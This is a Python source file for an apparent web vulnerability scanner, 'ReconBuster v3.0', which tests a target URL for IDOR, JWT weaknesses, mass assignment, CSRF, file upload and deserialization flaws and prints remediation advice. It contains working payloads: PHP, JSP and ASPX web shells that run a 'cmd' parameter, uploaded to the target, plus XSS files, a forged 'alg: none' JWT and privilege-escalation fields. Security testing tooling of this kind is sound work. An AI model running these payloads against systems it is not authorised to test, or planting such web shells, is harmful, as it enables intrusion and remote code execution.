"""
ReconBuster v3.0 - Advanced OWASP Top 10 Vulnerability Scanner
Covers missing vulnerabilities from OWASP Top 10:
- Broken Object Level Authorization (BOLA/IDOR)
- Broken Authentication
- Broken Access Control
- Security Misconfiguration
- Insecure Deserialization
- Mass Assignment
- CSRF (Cross-Site Request Forgery)
- Unrestricted File Upload
- Business Logic Flaws
- JWT Vulnerabilities
"""

import asyncio
import aiohttp
import re
import json
import base64
import hashlib
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import random
import string


@dataclass
class VulnerabilityFinding:
    """Vulnerability finding"""
    category: str
    severity: str  # critical, high, medium, low, info
    title: str
    description: str
    url: str
    evidence: str
    remediation: str
    cwe: str = ""
    cvss_score: float = 0.0
    proof_of_concept: str = ""


class OWASPAdvancedScanner:
    """Advanced OWASP vulnerability scanner"""

    def __init__(self, target: str, session: Optional[aiohttp.ClientSession] = None):
        self.target = target
        self.session = session
        self.findings: List[VulnerabilityFinding] = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]

    # ==================== BOLA/IDOR TESTING ====================

    async def test_bola_idor(self, authenticated_urls: List[str]) -> List[VulnerabilityFinding]:
        """
        Test for Broken Object Level Authorization (BOLA/IDOR)
        Tests if objects can be accessed by manipulating IDs
        """
        findings = []

        # Common ID parameter names
        id_params = ["id", "user_id", "userId", "uid", "account", "accountId",
                     "object_id", "objectId", "doc", "document", "file", "invoice"]

        # ID manipulation patterns
        test_patterns = {
            "increment": lambda x: str(int(x) + 1) if x.isdigit() else x,
            "decrement": lambda x: str(int(x) - 1) if x.isdigit() else x,
            "negative": lambda x: str(-int(x)) if x.isdigit() else x,
            "uuid_random": lambda x: "00000000-0000-0000-0000-000000000001",
            "string_pattern": lambda x: "admin" if x != "admin" else "user",
        }

        for url in authenticated_urls:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)

            # Check URL path for IDs (e.g., /api/users/123)
            path_parts = parsed.path.split('/')
            for i, part in enumerate(path_parts):
                if part.isdigit() or self._looks_like_id(part):
                    # Test IDOR by replacing ID
                    for pattern_name, pattern_func in test_patterns.items():
                        new_id = pattern_func(part)
                        new_path_parts = path_parts.copy()
                        new_path_parts[i] = new_id

                        test_url = urlunparse((
                            parsed.scheme, parsed.netloc, '/'.join(new_path_parts),
                            parsed.params, parsed.query, parsed.fragment
                        ))

                        # Test if accessible
                        is_vulnerable, evidence = await self._test_unauthorized_access(
                            original_url=url,
                            test_url=test_url,
                            original_id=part,
                            test_id=new_id
                        )

                        if is_vulnerable:
                            findings.append(VulnerabilityFinding(
                                category="BOLA/IDOR",
                                severity="high",
                                title=f"Broken Object Level Authorization (IDOR) via Path Parameter",
                                description=f"Object ID '{part}' can be manipulated to access other users' resources. "
                                           f"Accessing ID '{new_id}' returned unauthorized data.",
                                url=url,
                                evidence=evidence,
                                remediation="Implement proper authorization checks to verify the authenticated user "
                                           "has permission to access the requested object. Use indirect object references.",
                                cwe="CWE-639",
                                cvss_score=7.5,
                                proof_of_concept=f"curl -X GET '{test_url}' -H 'Authorization: Bearer <token>'"
                            ))

            # Check query parameters for IDs
            for param in id_params:
                if param in query_params:
                    original_value = query_params[param][0]

                    for pattern_name, pattern_func in test_patterns.items():
                        new_value = pattern_func(original_value)

                        # Build test URL
                        test_params = query_params.copy()
                        test_params[param] = [new_value]

                        test_url = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, urlencode(test_params, doseq=True), parsed.fragment
                        ))

                        is_vulnerable, evidence = await self._test_unauthorized_access(
                            original_url=url,
                            test_url=test_url,
                            original_id=original_value,
                            test_id=new_value
                        )

                        if is_vulnerable:
                            findings.append(VulnerabilityFinding(
                                category="BOLA/IDOR",
                                severity="high",
                                title=f"IDOR via '{param}' Query Parameter",
                                description=f"Parameter '{param}' allows unauthorized access to other objects.",
                                url=url,
                                evidence=evidence,
                                remediation="Implement authorization checks on object access. Validate user permissions.",
                                cwe="CWE-639",
                                cvss_score=7.5,
                                proof_of_concept=f"curl -X GET '{test_url}'"
                            ))

        return findings

    def _looks_like_id(self, value: str) -> bool:
        """Check if a value looks like an ID"""
        # UUID pattern
        if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', value, re.I):
            return True
        # MongoDB ObjectID pattern
        if re.match(r'^[0-9a-f]{24}$', value, re.I):
            return True
        # Base64 encoded
        if len(value) > 10 and re.match(r'^[A-Za-z0-9+/=]+$', value):
            return True
        return False

    async def _test_unauthorized_access(
        self, original_url: str, test_url: str, original_id: str, test_id: str
    ) -> Tuple[bool, str]:
        """Test if manipulation allows unauthorized access"""
        if not self.session:
            return False, ""

        try:
            # Fetch original resource
            async with self.session.get(original_url) as orig_resp:
                if orig_resp.status != 200:
                    return False, ""
                orig_content = await orig_resp.text()

            # Fetch manipulated resource
            async with self.session.get(test_url) as test_resp:
                if test_resp.status != 200:
                    return False, ""
                test_content = await test_resp.text()

                # Check if content is different (indicates access to different object)
                if test_content != orig_content:
                    # Check it's not an error page
                    if not self._is_error_page(test_content):
                        evidence = f"Accessed ID '{test_id}' returned different data than ID '{original_id}'. " \
                                  f"Original length: {len(orig_content)}, Test length: {len(test_content)}"
                        return True, evidence

        except Exception:
            pass

        return False, ""

    def _is_error_page(self, content: str) -> bool:
        """Check if response is an error page"""
        error_indicators = [
            'not found', '404', 'error', 'forbidden', 'access denied',
            'unauthorized', 'invalid', 'does not exist'
        ]
        content_lower = content.lower()
        return any(indicator in content_lower for indicator in error_indicators)

    # ==================== JWT VULNERABILITIES ====================

    async def test_jwt_vulnerabilities(self, jwt_token: str) -> List[VulnerabilityFinding]:
        """Test for JWT vulnerabilities"""
        findings = []

        try:
            # Decode JWT
            parts = jwt_token.split('.')
            if len(parts) != 3:
                return findings

            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

            # Test 1: Algorithm confusion (none algorithm)
            none_alg_finding = await self._test_jwt_none_algorithm(jwt_token, header, payload)
            if none_alg_finding:
                findings.append(none_alg_finding)

            # Test 2: Weak secret
            weak_secret_finding = await self._test_jwt_weak_secret(jwt_token)
            if weak_secret_finding:
                findings.append(weak_secret_finding)

            # Test 3: Missing expiration
            if 'exp' not in payload:
                findings.append(VulnerabilityFinding(
                    category="JWT Vulnerability",
                    severity="medium",
                    title="JWT Missing Expiration Claim",
                    description="JWT token does not contain an 'exp' (expiration) claim, allowing indefinite validity.",
                    url=self.target,
                    evidence=f"JWT payload: {json.dumps(payload, indent=2)}",
                    remediation="Add 'exp' claim to JWT tokens with reasonable expiration time (e.g., 15-60 minutes).",
                    cwe="CWE-613",
                    cvss_score=5.3
                ))

            # Test 4: Sensitive data in payload
            sensitive_keys = ['password', 'secret', 'api_key', 'private_key', 'ssn', 'credit_card']
            for key in payload.keys():
                if any(sensitive in key.lower() for sensitive in sensitive_keys):
                    findings.append(VulnerabilityFinding(
                        category="JWT Vulnerability",
                        severity="high",
                        title="Sensitive Data in JWT Payload",
                        description=f"JWT contains sensitive field '{key}' in payload. JWTs are only base64 encoded, not encrypted.",
                        url=self.target,
                        evidence=f"Sensitive key found: {key}",
                        remediation="Remove sensitive data from JWT payload. Use encrypted tokens (JWE) if sensitive data must be transmitted.",
                        cwe="CWE-312",
                        cvss_score=6.5
                    ))

        except Exception as e:
            pass

        return findings

    async def _test_jwt_none_algorithm(self, token: str, header: Dict, payload: Dict) -> Optional[VulnerabilityFinding]:
        """Test JWT 'none' algorithm vulnerability"""
        if not self.session:
            return None

        # Create JWT with 'none' algorithm
        none_header = header.copy()
        none_header['alg'] = 'none'

        # Encode new JWT
        new_header = base64.urlsafe_b64encode(json.dumps(none_header).encode()).decode().rstrip('=')
        new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        none_jwt = f"{new_header}.{new_payload}."

        # Test if accepted
        try:
            async with self.session.get(
                self.target,
                headers={"Authorization": f"Bearer {none_jwt}"}
            ) as resp:
                if resp.status == 200:
                    return VulnerabilityFinding(
                        category="JWT Vulnerability",
                        severity="critical",
                        title="JWT Algorithm Confusion - 'none' Algorithm Accepted",
                        description="Server accepts JWT tokens with 'alg: none', allowing authentication bypass.",
                        url=self.target,
                        evidence=f"Modified JWT accepted: {none_jwt[:50]}...",
                        remediation="Reject tokens with 'alg: none'. Whitelist allowed algorithms (e.g., RS256, HS256 only).",
                        cwe="CWE-347",
                        cvss_score=9.8,
                        proof_of_concept=f"curl -H 'Authorization: Bearer {none_jwt}' {self.target}"
                    )
        except Exception:
            pass

        return None

    async def _test_jwt_weak_secret(self, token: str) -> Optional[VulnerabilityFinding]:
        """Test for weak JWT secret using common wordlist"""
        common_secrets = [
            "secret", "password", "123456", "admin", "test", "key",
            "jwt", "token", "your-256-bit-secret", "secretkey", "qwerty"
        ]

        try:
            import jwt  # PyJWT library
            for secret in common_secrets:
                try:
                    decoded = jwt.decode(token, secret, algorithms=["HS256"])
                    return VulnerabilityFinding(
                        category="JWT Vulnerability",
                        severity="critical",
                        title="JWT Weak Secret Key",
                        description=f"JWT secret key is weak and easily guessable: '{secret}'",
                        url=self.target,
                        evidence=f"Token successfully decoded with secret: {secret}",
                        remediation="Use strong, randomly generated secrets (256+ bits). Store secrets securely.",
                        cwe="CWE-326",
                        cvss_score=9.1,
                        proof_of_concept=f"jwt.decode(token, '{secret}', algorithms=['HS256'])"
                    )
                except jwt.InvalidSignatureError:
                    continue
        except ImportError:
            pass  # PyJWT not installed

        return None

    # ==================== MASS ASSIGNMENT ====================

    async def test_mass_assignment(self, api_endpoint: str, method: str = "POST") -> List[VulnerabilityFinding]:
        """Test for mass assignment vulnerabilities"""
        findings = []

        if not self.session:
            return findings

        # Sensitive field names to test
        sensitive_fields = [
            "isAdmin", "is_admin", "admin", "role", "roles", "permissions",
            "is_superuser", "superuser", "is_staff", "staff",
            "account_balance", "balance", "credits", "price", "amount",
            "verified", "is_verified", "email_verified", "phone_verified",
            "active", "is_active", "enabled", "disabled"
        ]

        # Try to inject sensitive fields
        for field in sensitive_fields:
            payload = {
                "username": "testuser",
                "email": "test@example.com",
                field: True  # Try to escalate privileges
            }

            try:
                async with self.session.request(
                    method=method,
                    url=api_endpoint,
                    json=payload
                ) as resp:
                    if resp.status in [200, 201]:
                        response_text = await resp.text()

                        # Check if field was accepted
                        if field in response_text:
                            findings.append(VulnerabilityFinding(
                                category="Mass Assignment",
                                severity="high",
                                title=f"Mass Assignment Vulnerability - '{field}' Field",
                                description=f"API accepts unauthorized field '{field}' in request body, "
                                           f"potentially allowing privilege escalation.",
                                url=api_endpoint,
                                evidence=f"Field '{field}' accepted in {method} request and reflected in response",
                                remediation="Use allowlisting (whitelist) to explicitly define allowed fields. "
                                           "Implement proper input validation and object mapping.",
                                cwe="CWE-915",
                                cvss_score=7.3,
                                proof_of_concept=f"curl -X {method} '{api_endpoint}' -H 'Content-Type: application/json' "
                                                f"-d '{json.dumps(payload)}'"
                            ))
            except Exception:
                continue

        return findings

    # ==================== CSRF TESTING ====================

    async def test_csrf(self, form_url: str) -> List[VulnerabilityFinding]:
        """Test for CSRF vulnerabilities"""
        findings = []

        if not self.session:
            return findings

        try:
            # Fetch the form
            async with self.session.get(form_url) as resp:
                if resp.status != 200:
                    return findings

                content = await resp.text()

                # Check for CSRF token in form
                csrf_patterns = [
                    r'name=["\']csrf[_-]?token["\']',
                    r'name=["\']_token["\']',
                    r'name=["\']authenticity_token["\']',
                    r'X-CSRF-Token',
                    r'X-XSRF-TOKEN',
                ]

                has_csrf_protection = any(
                    re.search(pattern, content, re.IGNORECASE)
                    for pattern in csrf_patterns
                )

                if not has_csrf_protection:
                    # Check if form performs state-changing operations
                    form_actions = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', content, re.IGNORECASE)

                    for action in form_actions:
                        # Check if it's a state-changing endpoint
                        if any(keyword in action.lower() for keyword in [
                            'update', 'delete', 'create', 'transfer', 'payment',
                            'password', 'settings', 'profile', 'account'
                        ]):
                            findings.append(VulnerabilityFinding(
                                category="CSRF",
                                severity="high",
                                title="Missing CSRF Protection",
                                description=f"Form action '{action}' lacks CSRF token protection, "
                                           f"allowing Cross-Site Request Forgery attacks.",
                                url=form_url,
                                evidence=f"No CSRF token found in form submitting to: {action}",
                                remediation="Implement CSRF tokens (synchronizer token pattern) for all state-changing operations. "
                                           "Use SameSite cookie attribute. Verify Origin/Referer headers.",
                                cwe="CWE-352",
                                cvss_score=6.5,
                                proof_of_concept=f"<form action='{action}' method='POST'>"
                                                f"<input name='amount' value='1000000'><input type='submit'></form>"
                            ))

        except Exception:
            pass

        return findings

    # ==================== FILE UPLOAD ====================

    async def test_file_upload(self, upload_endpoint: str) -> List[VulnerabilityFinding]:
        """Test for unrestricted file upload vulnerabilities"""
        findings = []

        if not self.session:
            return findings

        # Malicious file test cases
        test_files = {
            "shell.php": b"<?php system($_GET['cmd']); ?>",
            "shell.jsp": b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
            "shell.aspx": b"<% Response.Write(new ActiveXObject('WScript.Shell').Exec(Request.QueryString('cmd')).StdOut.ReadAll()); %>",
            "test.svg": b'<svg onload="alert(document.domain)"></svg>',
            "test.html": b'<html><body><script>alert(document.domain)</script></body></html>',
        }

        for filename, content in test_files.items():
            try:
                form_data = aiohttp.FormData()
                form_data.add_field('file', content, filename=filename)

                async with self.session.post(upload_endpoint, data=form_data) as resp:
                    if resp.status in [200, 201]:
                        response_text = await resp.text()

                        # Check if file was accepted
                        if 'success' in response_text.lower() or filename in response_text:
                            findings.append(VulnerabilityFinding(
                                category="Unrestricted File Upload",
                                severity="critical",
                                title=f"Unrestricted File Upload - {filename} Extension Allowed",
                                description=f"Server accepts potentially malicious file with extension '{filename.split('.')[-1]}', "
                                           f"which could lead to remote code execution.",
                                url=upload_endpoint,
                                evidence=f"File '{filename}' was successfully uploaded",
                                remediation="Implement strict file type validation based on content (magic bytes), not just extension. "
                                           "Store uploads outside web root. Use allowlist of safe extensions. Scan uploads with antivirus.",
                                cwe="CWE-434",
                                cvss_score=9.8,
                                proof_of_concept=f"Upload {filename} to {upload_endpoint}"
                            ))
            except Exception:
                continue

        return findings

    # ==================== INSECURE DESERIALIZATION ====================

    async def test_insecure_deserialization(self, test_endpoints: List[str]) -> List[VulnerabilityFinding]:
        """Test for insecure deserialization vulnerabilities"""
        findings = []

        if not self.session:
            return findings

        # Serialized payload detection patterns
        patterns = {
            "Java": [
                b"\xac\xed\x00\x05",  # Java serialization magic bytes
                "rO0AB",  # Base64 encoded Java serialization
            ],
            "Python": [
                b"c__builtin__",  # Pickle
                b"cpickle",
            ],
            "PHP": [
                b"O:",  # PHP object serialization
                b"a:",  # PHP array serialization
            ],
            ".NET": [
                b"AAEAAAD/////",  # .NET binary formatter
            ]
        }

        for endpoint in test_endpoints:
            for lang, payload_patterns in patterns.items():
                for pattern in payload_patterns:
                    if isinstance(pattern, bytes):
                        payload = pattern + b"test"
                    else:
                        payload = pattern.encode()

                    try:
                        # Test in request body
                        async with self.session.post(endpoint, data=payload) as resp:
                            response_text = await resp.text()

                            # Check for deserialization errors (indicates processing)
                            error_indicators = [
                                'deserialization', 'unserialize', 'object', 'class',
                                'pickle', 'marshal', 'yaml.load', 'eval'
                            ]

                            if any(indicator in response_text.lower() for indicator in error_indicators):
                                findings.append(VulnerabilityFinding(
                                    category="Insecure Deserialization",
                                    severity="critical",
                                    title=f"Potential Insecure Deserialization ({lang})",
                                    description=f"Endpoint appears to deserialize {lang} objects from user input, "
                                               f"which could lead to remote code execution.",
                                    url=endpoint,
                                    evidence=f"Response contains deserialization-related errors: {response_text[:200]}",
                                    remediation="Avoid deserializing untrusted data. Use safe serialization formats (JSON, XML with DTD disabled). "
                                               "Implement integrity checks (HMAC) on serialized objects.",
                                    cwe="CWE-502",
                                    cvss_score=9.8,
                                    proof_of_concept=f"POST {endpoint} with {lang} serialized payload"
                                ))
                    except Exception:
                        continue

        return findings


# ==================== MAIN EXECUTION ====================

async def main():
    """Test the OWASP advanced scanner"""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python owasp_advanced_scanner.py <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    print(f"[*] Target: {target}\n")

    async with aiohttp.ClientSession() as session:
        scanner = OWASPAdvancedScanner(target, session)

        all_findings = []

        # Test BOLA/IDOR
        print("[*] Testing for BOLA/IDOR vulnerabilities...")
        bola_findings = await scanner.test_bola_idor([target])
        all_findings.extend(bola_findings)

        # Test CSRF
        print("[*] Testing for CSRF vulnerabilities...")
        csrf_findings = await scanner.test_csrf(target)
        all_findings.extend(csrf_findings)

        # Test Mass Assignment
        print("[*] Testing for Mass Assignment vulnerabilities...")
        mass_findings = await scanner.test_mass_assignment(target)
        all_findings.extend(mass_findings)

        print(f"\n[+] Found {len(all_findings)} vulnerabilities:\n")

        for i, finding in enumerate(all_findings, 1):
            print(f"#{i} [{finding.severity.upper()}] {finding.title}")
            print(f"   Category: {finding.category}")
            print(f"   URL: {finding.url}")
            print(f"   Evidence: {finding.evidence}")
            print(f"   Remediation: {finding.remediation}")
            print()


if __name__ == "__main__":
    asyncio.run(main())
